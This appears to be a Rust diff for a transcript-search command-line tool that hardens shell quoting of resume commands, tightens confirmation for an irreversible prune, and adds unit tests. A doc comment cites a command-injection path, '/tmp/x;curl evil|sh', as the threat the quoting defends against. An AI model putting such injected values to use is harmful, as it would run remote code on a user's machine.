@@ -37,10 +37,12 @@ fn claude_cmd() -> String {
 
 /// Quote a string for safe interpolation into a POSIX shell command.
 ///
-/// `resume_command` is documented as something you `eval` (README.md, SKILL.md), and
-/// `project_path` is transcript-derived, not validated: a directory named
-/// `/tmp/x;curl evil|sh` would otherwise execute on resume, and the benign form of the same
-/// bug is a plain space turning `cd /My Projects/app` into a cd somewhere else entirely.
+/// `resume_command` reaches a shell: the picker pipes it into `eval` (README.md documents
+/// `eval "$(ai-conversation-search pick)"`, and `bin/ai-conversation-search` takes the
+/// field verbatim), and REFERENCE.md documents the JSON field as eval-safe. `project_path`
+/// is transcript-derived and unvalidated, so a directory named `/tmp/x;curl evil|sh` would
+/// otherwise execute on resume; the benign form of the same bug is a plain space turning
+/// `cd /My Projects/app` into a cd somewhere else entirely.
 ///
 /// Conditional rather than unconditional so ordinary paths and UUIDs pass through byte for
 /// byte, which keeps the documented examples and the picker's field parsing unchanged.
@@ -59,13 +61,15 @@ fn shell_quote(s: &str) -> String {
 
 /// Whether a value can be safely interpolated into a resume command at all.
 ///
-/// Quoting cannot save two shapes, so they are refused rather than emitted:
+/// Rejects every control character, not just the three that motivate it, because quoting
+/// cannot save any of them and there is no value in a path that contains one:
 ///
-/// - A NUL terminates the string for the consuming shell mid-quote, leaving the quote open
+/// - NUL terminates the string for the consuming shell mid-quote, leaving the quote open
 ///   and splicing whatever follows into the command.
-/// - A newline or tab survives quoting but breaks the picker's tab-separated protocol
-///   (`bin/ai-conversation-search` splits fields with `cut`), so a fragment of the command
-///   would reach `eval` on its own.
+/// - Newline, carriage return and tab survive quoting but break the picker's
+///   tab-separated, one-row-per-line protocol (`bin/ai-conversation-search` splits fields
+///   with `cut`), so a fragment of the command would reach `eval` on its own.
+/// - ESC and friends would be rendered straight into a terminal by the picker.
 fn is_shell_safe_value(s: &str) -> bool {
     !s.chars().any(|c| c.is_control())
 }
@@ -73,9 +77,9 @@ fn is_shell_safe_value(s: &str) -> bool {
 /// Envelope for the list-shaped `--json` commands: `search`, `search --group-by-session`,
 /// and `list`.
 ///
-/// A bare array has nowhere to say "there was more than this". The truncation notice only
-/// ever went to stderr, so every machine consumer read a `--limit`-capped list as the
-/// complete answer -- which is how "not found" gets confused with "not looked for".
+/// stdout has to be able to say "there was more than this". A bare array cannot, and the
+/// stderr truncation notice is invisible to a consumer reading only stdout -- which is how
+/// "not found" gets confused with "not looked for".
 ///
 /// No `count` field: it is `results | length`, and a number sitting next to `truncated`
 /// reads as the total match count rather than the returned one.
@@ -90,10 +94,6 @@ struct JsonEnvelope {
 /// Top level for both shapes: `GroupedRow` carries its representative with
 /// `#[serde(flatten)]`, so `--group-by-session` rows put the message's own fields at the
 /// same level as `match_count`.
-///
-/// Deliberately one key lookup rather than a recursive walk. Recursion would also match
-/// `conversation.message_uuid` in embedded objects, which is the trap already documented on
-/// `inject_resume_command`.
 fn row_message_uuid(item: &serde_json::Value) -> Option<String> {
     item.get("message_uuid")
         .and_then(|v| v.as_str())
@@ -134,11 +134,9 @@ fn inject_full_content(
 
 /// Serialize rows into the envelope, inject `resume_command`, and print.
 ///
-/// `inject_resume_command` runs on the inner array *before* wrapping. It recurses into
-/// arrays and mutates session-bearing objects but does not descend into object values, so
-/// it would silently no-op on an already-wrapped envelope. Teaching it to descend was
-/// rejected: `tree` and `context` embed `conversation` objects that also carry
-/// `session_id`, and those would start sprouting `resume_command` keys as a side effect.
+/// Both injections run on the inner array *before* wrapping. `inject_resume_command`
+/// recurses into arrays and mutates session-bearing objects but does not descend into
+/// object values, so running it on the finished envelope would silently do nothing.
 fn print_json_envelope<T: serde::Serialize>(
     rows: &T,
     truncated: bool,
@@ -291,7 +289,7 @@ pub enum Commands {
         #[arg(long)]
         content: bool,
         /// Max characters of body to show with --content (default: 300)
-        #[arg(long, default_value_t = 300)]
+        #[arg(long, default_value_t = 300, requires = "content")]
         content_chars: usize,
         /// Show search diagnostics (session/message counts)
         #[arg(long, short = 'v')]
@@ -462,6 +460,11 @@ fn try_background_index() -> Option<()> {
 }
 
 pub fn run(cli: Cli) -> Result<()> {
+    // Before anything spawns the detached indexer, whose stderr goes to /dev/null. The
+    // indexer is the process that reads this variable, so a warning raised there is
+    // invisible to the person who set it -- which is the whole failure being warned about.
+    crate::indexer::warn_on_unrecognised_observer_flag();
+
     match cli.command {
         None => {
             // Print help
@@ -702,23 +705,31 @@ fn cmd_index(days: i64, all: bool, force: bool, quiet: bool) -> Result<()> {
     Ok(())
 }
 
-/// Remove claude-mem observer sessions that earlier versions indexed.
-///
-/// Deliberately a command rather than a schema migration: migrations run inside the
-/// detached indexer that `search` spawns, so a destructive one would fire silently on the
-/// first search after upgrading, before anyone could take a backup.
-/// Ask before an irreversible delete.
+/// Decide whether an irreversible delete may proceed.
 ///
 /// A non-TTY without `--yes` is refused rather than assumed. This command is reachable from
 /// scripts and from agent shells, which never have a terminal, and "nobody answered" must
 /// not read as "yes" for something that cannot be undone.
-fn confirm_prune(count: i64, assume_yes: bool) -> Result<bool> {
-    use std::io::{IsTerminal, Write};
+///
+/// Only "y"/"yes" mean yes -- a prefix match would accept "yesterday", and treating an
+/// empty line as consent would make a stray Enter destructive.
+///
+/// `is_terminal` and `reader` are parameters rather than reads of the real stdin so both
+/// branches are reachable in tests. Probing `std::io::stdin()` directly made the outcome
+/// depend on how `cargo test` was launched: green under CI, and a blocking `read_line` on a
+/// developer's terminal.
+fn confirm_prune(
+    count: i64,
+    assume_yes: bool,
+    is_terminal: bool,
+    reader: &mut impl std::io::BufRead,
+) -> Result<bool> {
+    use std::io::Write;
 
     if assume_yes {
         return Ok(true);
     }
-    if !std::io::stdin().is_terminal() {
+    if !is_terminal {
         eprintln!(
             "Refusing to remove {} session(s) without confirmation.",
             count
@@ -735,13 +746,18 @@ fn confirm_prune(count: i64, assume_yes: bool) -> Result<bool> {
     );
     let _ = std::io::stderr().flush();
     let mut answer = String::new();
-    std::io::stdin().read_line(&mut answer)?;
+    reader.read_line(&mut answer)?;
     Ok(matches!(
         answer.trim().to_ascii_lowercase().as_str(),
         "y" | "yes"
     ))
 }
 
+/// Remove claude-mem observer sessions that earlier versions indexed.
+///
+/// Deliberately a command rather than a schema migration: migrations run inside the
+/// detached indexer that `search` spawns, so a destructive one would fire silently on the
+/// first search after upgrading, before anyone could take a backup.
 fn cmd_prune_observer(dry_run: bool, assume_yes: bool) -> Result<()> {
     let mut indexer = ConversationIndexer::new(db::DEFAULT_DB_PATH, false)?;
 
@@ -752,8 +768,11 @@ fn cmd_prune_observer(dry_run: bool, assume_yes: bool) -> Result<()> {
             "Would remove {} claude-mem observer session(s) and rebuild the full-text index.",
             count
         );
-        for (session_id, project_path, first_message_at) in sample {
-            eprintln!("  {}  {}  {}", first_message_at, session_id, project_path);
+        for s in sample {
+            eprintln!(
+                "  {}  {}  {}",
+                s.first_message_at, s.session_id, s.project_path
+            );
         }
         eprintln!("Re-run without --dry-run to apply.");
         return Ok(());
@@ -784,7 +803,9 @@ fn cmd_prune_observer(dry_run: bool, assume_yes: bool) -> Result<()> {
         "The observations themselves stay in claude-mem's own database; only this index changes."
     );
 
-    if !confirm_prune(count, assume_yes)? {
+    let stdin = std::io::stdin();
+    let is_terminal = std::io::IsTerminal::is_terminal(&stdin);
+    if !confirm_prune(count, assume_yes, is_terminal, &mut stdin.lock())? {
         eprintln!("Aborted. Nothing was removed.");
         return Ok(());
     }
@@ -971,12 +992,19 @@ fn inject_resume_command(val: &mut serde_json::Value) {
 
 /// Render a stored summary, or a placeholder when there is nothing to show.
 ///
-/// Whitespace-only counts as nothing: a row written before the indexers rejected blanks
-/// would otherwise print as a blank line, which reads as a rendering bug rather than a
-/// missing title. Covers `search`, `search --group-by-session` and `list` in one place.
+/// Whitespace-only counts as nothing: it would otherwise print as a blank line, which
+/// reads as a rendering bug rather than a missing title. The indexers reject blanks on the
+/// way in, but stored rows are not revisited unless the transcript changes, so the guard
+/// is needed here too. Covers `search`, `search --group-by-session` and `list` at once.
 fn display_summary(summary: Option<&str>) -> &str {
     match summary {
-        Some(s) if !s.trim().is_empty() => s,
+        Some(s) if !s.trim().is_empty() => {
+            // First non-blank line only. These rows are one line each, with a suffix after
+            // the summary (`(N matches)`, message counts), and an embedded newline pushes
+            // that suffix onto its own line and makes the row ungreppable. Slash-command
+            // transcripts carry multi-line summaries routinely.
+            s.lines().find(|l| !l.trim().is_empty()).unwrap_or(s)
+        }
         _ => "[no summary]",
     }
 }
@@ -984,8 +1012,8 @@ fn display_summary(summary: Option<&str>) -> &str {
 /// Truncate to `max` characters, reporting whether anything was dropped.
 ///
 /// `chars()`, not bytes: the corpus is largely Japanese and a byte slice would panic on a
-/// multibyte boundary. The bool exists because appending an ellipsis unconditionally told
-/// the reader that a complete twelve-character message had been cut short.
+/// multibyte boundary. The bool is returned rather than left to the caller to infer from
+/// the length, because an unconditional ellipsis claims a complete message was cut short.
 fn truncate_chars(s: &str, max: usize) -> (String, bool) {
     let out: String = s.chars().take(max).collect();
     let dropped = s.chars().nth(max).is_some();
@@ -1026,8 +1054,8 @@ fn cmd_search(
             stats.truncated,
             show_content.then_some((&search, content_chars)),
         )?;
-        // Kept on stderr as well: someone piping into jq still benefits from the line,
-        // and dropping it would be a second breaking change for no gain.
+        // Also on stderr: a human piping stdout into jq never sees the envelope's
+        // `truncated`, so the line still has a reader.
         print_truncation_notice(stats.truncated, results.len(), "results");
         if verbose {
             eprintln!(
@@ -1310,9 +1338,10 @@ fn cmd_list(filter: &SearchFilter<'_>, json_output: bool) -> Result<()> {
 
 /// Exit status for a tree result.
 ///
-/// `error` means nothing usable came back -- an unresolvable or ambiguous session id. A
-/// script reading `$?` has to be able to tell that from a conversation that is genuinely
-/// empty, which is what exiting 0 used to say.
+/// `error` means no tree came back: an unresolvable or ambiguous session id, but also a
+/// session that resolved and whose transcript could not be read (`raw_tree_error`). A
+/// script reading `$?` has to be able to tell any of those from a conversation that is
+/// genuinely empty.
 ///
 /// `warning` deliberately stays 0: it means partial data *was* returned, and a non-zero
 /// exit would tell callers to throw away output they should be reading.
@@ -1434,6 +1463,115 @@ mod tests {
     }
 
     #[test]
+    fn test_display_summary_collapses_to_first_line() {
+        // Row layout is one line with a suffix after the summary; a newline would push
+        // that suffix onto its own line.
+        assert_eq!(
+            display_summary(Some("<command-message>daily-report</command-message>\n<command-name>/daily-report</command-name>")),
+            "<command-message>daily-report</command-message>"
+        );
+    }
+
+    #[test]
+    fn test_display_summary_skips_leading_blank_lines() {
+        assert_eq!(
+            display_summary(Some("\n\n  \nReal Title\nmore")),
+            "Real Title"
+        );
+    }
+
+    /// A `ConversationSearch` over an in-memory DB holding one message.
+    fn search_with_message(uuid: &str, body: &str) -> ConversationSearch {
+        let conn = rusqlite::Connection::open_in_memory().unwrap();
+        conn.execute_batch("PRAGMA foreign_keys = OFF;").unwrap();
+        conn.execute_batch(include_str!("../data/schema.sql"))
+            .unwrap();
+        conn.execute(
+            "INSERT INTO messages (message_uuid, session_id, depth, timestamp, message_type, project_path, full_content)
+             VALUES (?, 'sess1', 0, '2025-01-15T10:00:00', 'user', '/proj', ?)",
+            rusqlite::params![uuid, body],
+        )
+        .unwrap();
+        ConversationSearch::from_connection(conn)
+    }
+
+    #[test]
+    fn test_inject_full_content_attaches_body_and_truncation_flag() {
+        let search = search_with_message("m1", "abcdefghij");
+        let mut rows = serde_json::json!([{"message_uuid": "m1", "session_id": "sess1"}]);
+
+        inject_full_content(&mut rows, &search, 5);
+
+        assert_eq!(rows[0]["full_content"], "abcde");
+        assert_eq!(rows[0]["full_content_truncated"], true);
+    }
+
+    #[test]
+    fn test_inject_full_content_flags_untruncated_body() {
+        let search = search_with_message("m1", "short");
+        let mut rows = serde_json::json!([{"message_uuid": "m1"}]);
+
+        inject_full_content(&mut rows, &search, 300);
+
+        assert_eq!(rows[0]["full_content"], "short");
+        assert_eq!(rows[0]["full_content_truncated"], false);
+    }
+
+    /// The grouped shape must work through the real serializer, not a hand-written JSON
+    /// literal: the lookup depends on `GroupedRow` flattening its representative, and only
+    /// serializing an actual `GroupedRow` proves that still holds.
+    #[test]
+    fn test_inject_full_content_handles_serialized_grouped_row() {
+        let search = search_with_message("m1", "grouped body");
+        let row = crate::search::GroupedRow {
+            representative: crate::search::SearchResultRow {
+                rowid: 1,
+                message_uuid: "m1".to_string(),
+                session_id: "sess1".to_string(),
+                parent_uuid: None,
+                timestamp: "2025-01-15T10:00:00".to_string(),
+                message_type: "user".to_string(),
+                project_path: Some("/proj".to_string()),
+                depth: 0,
+                is_sidechain: false,
+                context_snippet: "snippet".to_string(),
+                conversation_summary: None,
+                conversation_file: None,
+                source: Some("claude_code".to_string()),
+            },
+            match_count: 3,
+        };
+        let mut rows = serde_json::to_value(vec![row]).unwrap();
+
+        inject_full_content(&mut rows, &search, 300);
+
+        assert_eq!(rows[0]["match_count"], 3, "flattened shape assumption");
+        assert_eq!(rows[0]["full_content"], "grouped body");
+    }
+
+    #[test]
+    fn test_inject_full_content_leaves_rows_without_a_body_alone() {
+        // No such message: the row must not gain a half-populated pair of keys.
+        let search = search_with_message("m1", "body");
+        let mut rows = serde_json::json!([{"message_uuid": "absent"}]);
+
+        inject_full_content(&mut rows, &search, 300);
+
+        assert!(rows[0].get("full_content").is_none());
+        assert!(rows[0].get("full_content_truncated").is_none());
+    }
+
+    #[test]
+    fn test_inject_full_content_ignores_non_array() {
+        let search = search_with_message("m1", "body");
+        let mut not_an_array = serde_json::json!({"message_uuid": "m1"});
+
+        inject_full_content(&mut not_an_array, &search, 300);
+
+        assert!(not_an_array.get("full_content").is_none());
+    }
+
+    #[test]
     fn test_row_message_uuid_reads_top_level() {
         let row = serde_json::json!({"message_uuid": "abc-123"});
         assert_eq!(row_message_uuid(&row).as_deref(), Some("abc-123"));
@@ -1447,9 +1585,8 @@ mod tests {
     }
 
     #[test]
-    fn test_row_message_uuid_ignores_unrelated_nesting() {
-        // A recursive walk would find this one; the lookup is deliberately not recursive.
-        let row = serde_json::json!({"conversation": {"message_uuid": "abc-123"}});
+    fn test_row_message_uuid_absent_is_none() {
+        let row = serde_json::json!({"session_id": "s1", "conversation_summary": "x"});
         assert_eq!(row_message_uuid(&row), None);
     }
 
@@ -1520,22 +1657,50 @@ mod tests {
         assert_eq!(tree_exit_code(&tree_fixture(None, None)), 0);
     }
 
+    /// `confirm_prune` with an explicit answer on a simulated terminal.
+    fn confirm_with_input(answer: &str) -> bool {
+        let mut reader = std::io::Cursor::new(answer.as_bytes().to_vec());
+        confirm_prune(5, false, true, &mut reader).unwrap()
+    }
+
     #[test]
     fn test_confirm_prune_yes_flag_skips_stdin() {
-        // Must not read stdin at all -- this is the path scripts and agents take.
-        assert!(confirm_prune(5, true).unwrap());
+        // Must not read the reader at all -- this is the path scripts and agents take.
+        // An empty reader would return EOF, which parses as "no", so a passing assertion
+        // here proves --yes short-circuits before any read.
+        let mut empty = std::io::Cursor::new(Vec::new());
+        assert!(confirm_prune(5, true, false, &mut empty).unwrap());
     }
 
     #[test]
     fn test_confirm_prune_refuses_without_tty() {
-        // The test harness's stdin is not a terminal, which is exactly the property under
-        // test: no terminal and no --yes must be an error, never a silent "yes".
-        let err = confirm_prune(5, false).expect_err("non-TTY without --yes must be refused");
+        let mut reader = std::io::Cursor::new(b"y\n".to_vec());
+        let err = confirm_prune(5, false, false, &mut reader)
+            .expect_err("non-TTY without --yes must be refused");
         assert!(
             err.to_string().contains("--yes"),
             "error should name the flag that unblocks it, got: {}",
             err
         );
+        // The refusal must not depend on what was piped in: a script echoing "y" into the
+        // command must still be refused, not silently obeyed.
+        assert_eq!(reader.position(), 0, "stdin must not be consumed");
+    }
+
+    #[test]
+    fn test_confirm_prune_accepts_yes_spellings() {
+        for answer in ["y\n", "Y\n", "yes\n", "YES\n", " y \n"] {
+            assert!(confirm_with_input(answer), "answer = {:?}", answer);
+        }
+    }
+
+    #[test]
+    fn test_confirm_prune_rejects_everything_else() {
+        // "" is a bare Enter and "" via EOF is a closed stdin; neither is consent.
+        // "yesterday" is the case a `starts_with("y")` implementation would get wrong.
+        for answer in ["\n", "", "n\n", "no\n", "yesterday\n", "sure\n"] {
+            assert!(!confirm_with_input(answer), "answer = {:?}", answer);
+        }
     }
 
     #[test]
